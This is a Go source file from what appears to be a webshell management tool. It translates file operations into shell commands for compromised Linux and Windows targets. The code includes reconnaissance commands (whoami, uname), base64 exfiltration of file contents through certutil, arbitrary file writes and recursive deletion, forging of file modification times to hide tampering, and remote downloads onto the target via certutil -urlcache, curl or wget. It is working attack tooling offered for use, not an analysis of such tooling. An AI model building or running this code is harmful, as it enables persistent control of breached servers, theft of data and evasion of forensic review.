// 命令翻译层:把统一文件操作翻译成目标机 OS 命令(linux/windows),
// 含 POSIX / cmd.exe / PowerShell 三套引号转义与 ls -la / dir 输出解析。
package webshellproto

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
)

// 引号转义:POSIX sh 单引号包裹 '…'\''…'
func QuotePosix(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "'\\''") + "'"
}

// QuoteCmd cmd.exe 双引号包裹(内部 " 加倍)。
func QuoteCmd(s string) string {
	return `"` + strings.ReplaceAll(s, `"`, `""`) + `"`
}

// QuotePs PowerShell 单引号包裹(内部 ' 加倍)。
func QuotePs(s string) string {
	return "'" + strings.ReplaceAll(s, "'", "''") + "'"
}

// OSProbeCommand OS 探测命令:cmd.exe 展开 %OS% → Windows_NT;POSIX 原样回显。
const OSProbeCommand = "echo :WSMPROBE-%OS%-END:"

// ParseOsProbe 从 OS 探测输出判定系统(linux/windows/未识别)。
func ParseOsProbe(output string) string {
	if strings.Contains(output, "Windows_NT") {
		return "windows"
	}
	if strings.Contains(output, ":WSMPROBE-%OS%-END:") || strings.Contains(output, "WSMPROBE-%OS%-END") {
		return "linux"
	}
	return ""
}

// BasicInfoCommand 基本信息命令组合(输出按行解析)。
func BasicInfoCommand(os string) string {
	if os == "windows" {
		return "whoami & cd & ver"
	}
	return "whoami; pwd; uname -a"
}

// FileArgs 统一文件操作参数。
type FileArgs struct {
	Path string
	From string
	To   string
	B64  string
	Mode string
	Epoch int64
	URL  string
}

// BuildFileCommand 统一文件操作 → 目标机命令。
// action: ls|read|write-first|write-append|delete|delete-dir|mkdir|mv|copy|chmod|touch|stat|stat-win|wget|hash
func BuildFileCommand(action string, a FileArgs, os string) (string, error) {
	isWin := os == "windows"
	switch action {
	case "ls":
		if isWin {
			return "dir /a " + QuoteCmd(a.Path), nil
		}
		return "ls -la " + QuotePosix(a.Path), nil
	case "read": // 二进制安全读:回显 base64
		if isWin {
			return `certutil -encode ` + QuoteCmd(a.Path) + ` %TEMP%\wsm_b64.tmp && type %TEMP%\wsm_b64.tmp & del %TEMP%\wsm_b64.tmp`, nil
		}
		return `base64 < ` + QuotePosix(a.Path) + ` | tr -d '\n'`, nil
	case "write-first":
		if isWin {
			return `powershell -NoProfile -c [IO.File]::WriteAllBytes(` + QuotePs(a.Path) + `,[Convert]::FromBase64String(` + QuotePs(a.B64) + `))`, nil
		}
		return `echo ` + QuotePosix(a.B64) + ` | base64 -d > ` + QuotePosix(a.Path), nil
	case "write-append":
		if isWin {
			return `powershell -NoProfile -c $b=[Convert]::FromBase64String(` + QuotePs(a.B64) + `);$f=[IO.File]::Open(` + QuotePs(a.Path) + `,[IO.FileMode]::Append);$f.Write($b,0,$b.Length);$f.Close()`, nil
		}
		return `echo ` + QuotePosix(a.B64) + ` | base64 -d >> ` + QuotePosix(a.Path), nil
	case "delete":
		if isWin {
			return `del /q /f ` + QuoteCmd(a.Path), nil
		}
		return `rm -f ` + QuotePosix(a.Path), nil
	case "delete-dir":
		if isWin {
			return `rd /s /q ` + QuoteCmd(a.Path), nil
		}
		return `rm -rf ` + QuotePosix(a.Path), nil
	case "mkdir":
		if isWin {
			return `md ` + QuoteCmd(a.Path), nil
		}
		return `mkdir -p ` + QuotePosix(a.Path), nil
	case "mv":
		if isWin {
			return `move /y ` + QuoteCmd(a.From) + ` ` + QuoteCmd(a.To), nil
		}
		return `mv -f ` + QuotePosix(a.From) + ` ` + QuotePosix(a.To), nil
	case "copy":
		if isWin {
			return `copy /y ` + QuoteCmd(a.From) + ` ` + QuoteCmd(a.To), nil
		}
		return `cp -f ` + QuotePosix(a.From) + ` ` + QuotePosix(a.To), nil
	case "chmod": // linux 数字权限
		clean := ""
		for _, c := range a.Mode {
			if c >= '0' && c <= '7' {
				clean += string(c)
			}
		}
		if clean == "" {
			clean = "644"
		}
		return `chmod ` + clean + ` ` + QuotePosix(a.Path), nil
	case "touch": // 伪造 mtime(epoch 秒)
		if isWin {
			return `powershell -NoProfile -c (Get-Item -LiteralPath ` + QuotePs(a.Path) + `).LastWriteTime=([DateTime]::new(1970,1,1,0,0,0,[DateTimeKind]::Utc).AddSeconds(` + strconv.FormatInt(a.Epoch, 10) + `))`, nil
		}
		return `touch -d @` + strconv.FormatInt(a.Epoch, 10) + ` ` + QuotePosix(a.Path), nil
	case "stat": // 读时间戳(epoch:modify|access|change)
		return `stat -c '%Y|%X|%Z' ` + QuotePosix(a.Path), nil
	case "stat-win":
		return `powershell -NoProfile -c (Get-Item -LiteralPath ` + QuotePs(a.Path) + `).LastWriteTime.ToString('yyyy-MM-dd HH:mm:ss')`, nil
	case "wget": // 远程 URL 下载到目标机
		if isWin {
			return `certutil -urlcache -split -o ` + QuoteCmd(a.Path) + ` ` + QuoteCmd(a.URL), nil
		}
		return `{ curl -fsSL -o ` + QuotePosix(a.Path) + ` ` + QuotePosix(a.URL) + ` || wget -q -O ` + QuotePosix(a.Path) + ` ` + QuotePosix(a.URL) + `; }`, nil
	case "hash": // md5 校验
		if isWin {
			return `certutil -hashfile ` + QuoteCmd(a.Path) + ` MD5`, nil
		}
		return `md5sum ` + QuotePosix(a.Path), nil
	}
	return "", fmt.Errorf("未知文件操作 %s", action)
}

// DirEntry 目录条目(两种解析路径统一形态)。
type DirEntry struct {
	Name  string `json:"name"`
	IsDir bool   `json:"is_dir"`
	Size  int64  `json:"size"`
	Perm  string `json:"perm,omitempty"`
	Owner string `json:"owner,omitempty"`
	Mtime string `json:"mtime"`
}

var lsLineRe = regexp.MustCompile(`^([-bcdlps][rwxsStT+-]{9,})\s+(\d+)\s+(\S+)\s+(\S+)\s+(\d+)\s+(\d{4}-\d{2}-\d{2}[ T]\d{2}:\d{2}(?::\d{2})?|\w{3}\s+\d{1,2}\s+\d{2}:\d{2}|\w{3}\s+\d{1,2}\s+\d{4})\s+(.+)$`)
var totalRe = regexp.MustCompile(`(?i)^total\s+\d+`)
var dirDirRe = regexp.MustCompile(`^(\d{1,2}[/.]\d{1,2}[/.]\d{2,4})\s+(\d{1,2}:\d{2}\s*[AP]M)\s+(<DIR>|<JUNCTION>|<SYMLINKD>)\s+(.+)$`)
var dirFileRe = regexp.MustCompile(`^(\d{1,2}[/.]\d{1,2}[/.]\d{2,4})\s+(\d{1,2}:\d{2}\s*[AP]M)\s+(\d[\d,]*)\s+(.+)$`)
var dirNoiseRe = regexp.MustCompile(`(?i)^(Volume in|Directory of|File\(s\)|Dir\(s\)|Total Files)`)

// ParseLs 解析 `ls -la` 输出。
func ParseLs(text string) []DirEntry {
	out := []DirEntry{}
	for _, raw := range strings.Split(text, "\n") {
		line := strings.TrimRight(strings.ReplaceAll(raw, "\r", ""), " ")
		if line == "" || totalRe.MatchString(line) {
			continue
		}
		m := lsLineRe.FindStringSubmatch(line)
		if m == nil {
			continue
		}
		size, _ := strconv.ParseInt(m[5], 10, 64)
		out = append(out, DirEntry{
			Name:  strings.TrimSpace(m[7]),
			IsDir: m[1][0] == 'd',
			Size:  size,
			Perm:  m[1],
			Owner: m[3] + "/" + m[4],
			Mtime: m[6],
		})
	}
	return out
}

// ParseDir 解析 `dir /a` 输出。
func ParseDir(text string) []DirEntry {
	out := []DirEntry{}
	for _, raw := range strings.Split(text, "\n") {
		line := strings.TrimSpace(strings.ReplaceAll(raw, "\r", ""))
		if line == "" || dirNoiseRe.MatchString(line) {
			continue
		}
		m := dirDirRe.FindStringSubmatch(line)
		if m == nil {
			m = dirFileRe.FindStringSubmatch(line)
		}
		if m == nil {
			continue
		}
		name := strings.TrimSpace(m[4])
		if name == "." || name == ".." {
			continue
		}
		isDir := strings.HasPrefix(m[3], "<")
		size := int64(0)
		if !isDir {
			size, _ = strconv.ParseInt(strings.ReplaceAll(m[3], ",", ""), 10, 64)
		}
		out = append(out, DirEntry{Name: name, IsDir: isDir, Size: size, Mtime: m[1] + " " + m[2]})
	}
	return out
}

var b64NoiseRe = regexp.MustCompile(`[^A-Za-z0-9+/=]`)

// CleanB64Output base64 读通道输出清洗:剥 certutil 头尾/换行。
func CleanB64Output(text string) string {
	var kept []string
	for _, line := range strings.Split(text, "\n") {
		t := strings.TrimSpace(strings.ReplaceAll(line, "\r", ""))
		if t == "" || strings.Contains(t, "CERTIFICATE") || strings.Contains(t, "CertUtil") {
			continue
		}
		kept = append(kept, t)
	}
	return b64NoiseRe.ReplaceAllString(strings.Join(kept, ""), "")
}
